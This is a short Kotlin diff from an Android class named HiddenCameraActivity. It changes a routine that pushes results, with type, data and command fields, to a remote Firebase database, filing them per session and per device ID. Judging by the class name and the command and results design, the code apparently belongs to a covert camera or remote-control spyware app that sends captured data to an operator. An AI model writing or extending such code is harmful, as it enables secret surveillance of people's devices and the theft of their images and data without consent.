@@ -192,7 +192,9 @@ class HiddenCameraActivity : Activity() {
 
     private fun postResult(type: String, data: String, command: String = "") {
         val currentSessionKey = sessionKey ?: return
-        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
+        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
+        val currentDeviceId = prefs.getString("DEVICE_ID", null) ?: return
+        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("devices").child(currentDeviceId).child("results").push()
         val payload = mapOf(
             "type" to type,
             "data" to data,
